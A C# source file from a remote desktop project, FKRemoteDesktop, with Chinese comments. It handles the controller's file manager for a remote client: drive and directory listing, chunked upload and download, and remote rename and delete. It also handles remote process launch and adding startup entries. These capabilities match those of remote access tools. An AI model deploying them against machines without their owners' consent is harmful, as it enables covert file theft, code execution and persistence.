using FKRemoteDesktop.Enums;
using FKRemoteDesktop.Message.MessageStructs;
using FKRemoteDesktop.Message.SubMessages;
using FKRemoteDesktop.Network;
using FKRemoteDesktop.Structs;
using FKRemoteDesktop.Utilities;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Message.SubMessageHandler
{
    // 处理和远程文件和目录交互的消息
    public class FileManagerHandler : MessageProcessorBase<string>, IDisposable
    {
        /// <summary>
        /// 目标驱动器更变事件
        /// </summary>
        /// <param name="sender">事件发送者</param>
        /// <param name="drives">当前可用的驱动器列表</param>
        public delegate void DrivesChangedEventHandler(object sender, Drive[] drives);
        public event DrivesChangedEventHandler DrivesChanged;
        private void OnDrivesChanged(Drive[] drives)
        {
            SynchronizationContext.Post(d =>
            {
                var handler = DrivesChanged;
                handler?.Invoke(this, (Drive[])d);
            }, drives);
        }

        /// <summary>
        /// 目标目录更变事件
        /// </summary>
        /// <param name="sender">事件发送者</param>
        /// <param name="remotePath">目标的远程路径</param>
        /// <param name="items">目录的内容</param>
        public delegate void DirectoryChangedEventHandler(object sender, string remotePath, FileSystemEntry[] items);
        public event DirectoryChangedEventHandler DirectoryChanged;
        private void OnDirectoryChanged(string remotePath, FileSystemEntry[] items)
        {
            SynchronizationContext.Post(i =>
            {
                var handler = DirectoryChanged;
                handler?.Invoke(this, remotePath, (FileSystemEntry[])i);
            }, items);
        }

        /// <summary>
        /// 文件传输事件
        /// </summary>
        /// <param name="sender">事件发送者</param>
        /// <param name="transfer">更新的文件传输</param>
        public delegate void FileTransferUpdatedEventHandler(object sender, SFileTransfer transfer);
        public event FileTransferUpdatedEventHandler FileTransferUpdated;
        private void OnFileTransferUpdated(SFileTransfer transfer)
        {
            SynchronizationContext.Post(t =>
            {
                var handler = FileTransferUpdated;
                handler?.Invoke(this, (SFileTransfer)t);
            }, transfer.Clone());
        }

        // 文件传输信息
        private readonly List<SFileTransfer> _activeFileTransfers = new List<SFileTransfer>();
        // 同步UI线程和线程池之间的访问锁
        private readonly object _syncLock = new object();
        // 与这个文件管理器相关的客户端
        private readonly Client _client;
        // 最多允许同时上传俩个文件
        private readonly Semaphore _limitThreads = new Semaphore(2, 2);
        // 客户端基本下载目录路径
        private readonly string _baseDownloadPath;
        // 上传下载任务
        private readonly TaskManagerHandler _taskManagerHandler;

        public FileManagerHandler(Client client, string subDirectory = "") : base(true)
        {
            _client = client;
            _baseDownloadPath = Path.Combine(client.UserInfo.DownloadDirectory, subDirectory);
            _taskManagerHandler = new TaskManagerHandler(client);
            _taskManagerHandler.ProcessActionPerformed += ProcessActionPerformed;
            MessageHandler.Register(_taskManagerHandler);
        }

        public override bool CanExecute(IMessage message) => message is FileTransferChunk ||
                                                     message is FileTransferCancel ||
                                                     message is FileTransferComplete ||
                                                     message is GetDrivesResponse ||
                                                     message is GetDirectoryResponse ||
                                                     message is SetStatusFileManager;

        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case FileTransferChunk file:
                    Execute(sender, file);
                    break;
                case FileTransferCancel cancel:
                    Execute(sender, cancel);
                    break;
                case FileTransferComplete complete:
                    Execute(sender, complete);
                    break;
                case GetDrivesResponse drive:
                    Execute(sender, drive);
                    break;
                case GetDirectoryResponse directory:
                    Execute(sender, directory);
                    break;
                case SetStatusFileManager status:
                    Execute(sender, status);
                    break;
            }
        }

        // 获取文件传输唯一ID
        private int GetUniqueFileTransferId()
        {
            int id;
            lock (_syncLock)
            {
                do
                {
                    id = SFileTransfer.GetRandomTransferId();
                } while (_activeFileTransfers.Any(f => f.Id == id));
            }
            return id;
        }

        /// <summary>
        /// 开始从客户端下载文件
        /// </summary>
        /// <param name="remotePath">要下载文件的远程路径</param>
        /// <param name="localFileName">本地文件名</param>
        /// <param name="overwrite">是否覆盖本地文件</param>
        public void BeginDownloadFile(string remotePath, string localFileName = "", bool overwrite = false)
        {
            if (string.IsNullOrEmpty(remotePath))
                return;

            int id = GetUniqueFileTransferId();

            if (!Directory.Exists(_baseDownloadPath))
                Directory.CreateDirectory(_baseDownloadPath);

            string fileName = string.IsNullOrEmpty(localFileName) ? Path.GetFileName(remotePath) : localFileName;
            string localPath = Path.Combine(_baseDownloadPath, fileName);

            int i = 1;
            while (!overwrite && File.Exists(localPath))
            {
                var newFileName = string.Format("{0}({1}){2}", Path.GetFileNameWithoutExtension(localPath), i, Path.GetExtension(localPath));
                localPath = Path.Combine(_baseDownloadPath, newFileName);
                i++;
            }

            var transfer = new SFileTransfer
            {
                Id = id,
                Type = ETransferType.eTransferType_Download,
                LocalPath = localPath,
                RemotePath = remotePath,
                Status = "等待处理中...",
                TransferredSize = 0
            };

            try
            {
                transfer.FileSplit = new FileSplit(transfer.LocalPath, FileAccess.Write);
            }
            catch (Exception)
            {
                transfer.Status = "写入文件时出错";
                OnFileTransferUpdated(transfer);
                return;
            }

            transfer.Size = transfer.FileSplit.FileSize;    // 文件大小

            lock (_syncLock)
            {
                _activeFileTransfers.Add(transfer);
            }

            OnFileTransferUpdated(transfer);
            _client.Send(new FileTransferRequest { RemotePath = remotePath, Id = id });
        }

        /// <summary>
        /// 开始向客户端进行文件上传
        /// </summary>
        /// <param name="localPath">等待上传的文件本地路径</param>
        /// <param name="remotePath">上传后保存的目标路径</param>
        public void BeginUploadFile(string localPath, string remotePath = "")
        {
            new Thread(() =>
            {
                int id = GetUniqueFileTransferId();

                SFileTransfer transfer = new SFileTransfer
                {
                    Id = id,
                    Type = ETransferType.eTransferType_Upload,
                    LocalPath = localPath,
                    RemotePath = remotePath,
                    Status = "等待处理中...",
                    TransferredSize = 0
                };

                try
                {
                    transfer.FileSplit = new FileSplit(localPath, FileAccess.Read);
                }
                catch (Exception)
                {
                    transfer.Status = "读取文件时出错";
                    OnFileTransferUpdated(transfer);
                    return;
                }
                lock (_syncLock)
                {
                    _activeFileTransfers.Add(transfer);
                }

                transfer.Size = transfer.FileSplit.FileSize;
                OnFileTransferUpdated(transfer);

                _limitThreads.WaitOne();
                try
                {
                    // 分段上传
                    foreach (var chunk in transfer.FileSplit)
                    {
                        transfer.TransferredSize += chunk.Data.Length;
                        decimal progress = transfer.Size == 0 ? 100 : Math.Round((decimal)((double)transfer.TransferredSize / (double)transfer.Size * 100.0), 2);
                        transfer.Status = $"上传中...({progress}%)";
                        OnFileTransferUpdated(transfer);

                        bool transferCanceled;
                        lock (_syncLock)
                        {
                            transferCanceled = _activeFileTransfers.Count(f => f.Id == transfer.Id) == 0;
                        }

                        if (transferCanceled)
                        {
                            transfer.Status = "用户取消";
                            OnFileTransferUpdated(transfer);
                            _limitThreads.Release();
                            return;
                        }

                        _client.SendBlocking(new FileTransferChunk
                        {
                            Id = id,
                            Chunk = chunk,
                            FilePath = remotePath,
                            FileSize = transfer.Size
                        });
                    }
                }
                catch (Exception ex)
                {
                    lock (_syncLock)
                    {
                        // 传输被取消
                        if (_activeFileTransfers.Count(f => f.Id == transfer.Id) == 0)
                        {
                            _limitThreads.Release();
                            return;
                        }
                    }
                    transfer.Status = "读取文件时出错: " + ex.Message;
                    OnFileTransferUpdated(transfer);
                    CancelFileTransfer(transfer.Id);
                    _limitThreads.Release();
                    return;
                }

                _limitThreads.Release();
            }).Start();
        }

        // 取消文件传输
        public void CancelFileTransfer(int transferId)
        {
            _client.Send(new FileTransferCancel { Id = transferId });
        }

        // 重命名远程一个文件或文件夹
        public void RenameFile(string remotePath, string newPath, EFileType type)
        {
            _client.Send(new DoPathRename
            {
                Path = remotePath,
                NewPath = newPath,
                PathType = type
            });
        }

        // 删除远程一个文件或文件夹
        public void DeleteFile(string remotePath, EFileType type)
        {
            _client.Send(new DoPathDelete { Path = remotePath, PathType = type });
        }

        // 远程启动一个新进程
        public void StartProcess(string remotePath)
        {
            _taskManagerHandler.StartProcess(remotePath);
        }

        // 添加一项到客户端启动项
        public void AddToStartup(StartupItem item)
        {
            _client.Send(new DoStartupItemAdd { StartupItem = item });
        }

        // 获取远程目录下的内容
        public void GetDirectoryContents(string remotePath)
        {
            _client.Send(new GetDirectory { RemotePath = remotePath });
        }

        // 刷新远程驱动器
        public void RefreshDrives()
        {
            _client.Send(new GetDrives());
        }

        private void Execute(ISender client, FileTransferChunk message)
        {
            SFileTransfer transfer;
            lock (_syncLock)
            {
                transfer = _activeFileTransfers.FirstOrDefault(t => t.Id == message.Id);
            }

            if (transfer == null)
                return;
            transfer.Size = message.FileSize;
            transfer.TransferredSize += message.Chunk.Data.Length;

            try
            {
                transfer.FileSplit.WriteChunk(message.Chunk);
            }
            catch (Exception)
            {
                transfer.Status = "写入文件时出错";
                OnFileTransferUpdated(transfer);
                CancelFileTransfer(transfer.Id);
                return;
            }
            decimal progress = transfer.Size == 0 ? 100 : Math.Round((decimal)((double)transfer.TransferredSize / (double)transfer.Size * 100.0), 2);
            transfer.Status = $"下载中...({progress}%)";
            OnFileTransferUpdated(transfer);
        }

        private void Execute(ISender client, FileTransferCancel message)
        {
            SFileTransfer transfer;
            lock (_syncLock)
            {
                transfer = _activeFileTransfers.FirstOrDefault(t => t.Id == message.Id);
            }
            if (transfer != null)
            {
                transfer.Status = message.Reason;
                OnFileTransferUpdated(transfer);
                RemoveFileTransfer(transfer.Id);
                if (transfer.Type == ETransferType.eTransferType_Download)
                    File.Delete(transfer.LocalPath);
            }
        }

        private void Execute(ISender client, FileTransferComplete message)
        {
            SFileTransfer transfer;
            lock (_syncLock)
            {
                transfer = _activeFileTransfers.FirstOrDefault(t => t.Id == message.Id);
            }
            if (transfer != null)
            {
                transfer.RemotePath = message.FilePath;
                transfer.Status = "传输完成";
                RemoveFileTransfer(transfer.Id);
                OnFileTransferUpdated(transfer);
            }
        }

        private void Execute(ISender client, GetDrivesResponse message)
        {
            if (message.Drives?.Length == 0)
                return;
            OnDrivesChanged(message.Drives);
        }

        private void Execute(ISender client, GetDirectoryResponse message)
        {
            if (message.Items == null)
                message.Items = new FileSystemEntry[0];
            OnDirectoryChanged(message.RemotePath, message.Items);
        }

        private void Execute(ISender client, SetStatusFileManager message)
        {
            OnReport(message.Message);
        }

        private void ProcessActionPerformed(object sender, EProcessAction action, bool result)
        {
            if (action != EProcessAction.eProcessAction_Start) 
                return;
            OnReport(result ? "进程启动成功" : "进程启动失败");
        }

        // 移除文件传输
        private void RemoveFileTransfer(int transferId)
        {
            lock (_syncLock)
            {
                var transfer = _activeFileTransfers.FirstOrDefault(t => t.Id == transferId);
                transfer?.FileSplit?.Dispose();
                _activeFileTransfers.RemoveAll(s => s.Id == transferId);
            }
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_syncLock)
                {
                    foreach (var transfer in _activeFileTransfers)
                    {
                        _client.Send(new FileTransferCancel { Id = transfer.Id });
                        transfer.FileSplit?.Dispose();
                        if (transfer.Type == ETransferType.eTransferType_Download)
                            File.Delete(transfer.LocalPath);
                    }
                    _activeFileTransfers.Clear();
                }
                MessageHandler.Unregister(_taskManagerHandler);
                _taskManagerHandler.ProcessActionPerformed -= ProcessActionPerformed;
            }
        }
    }
}
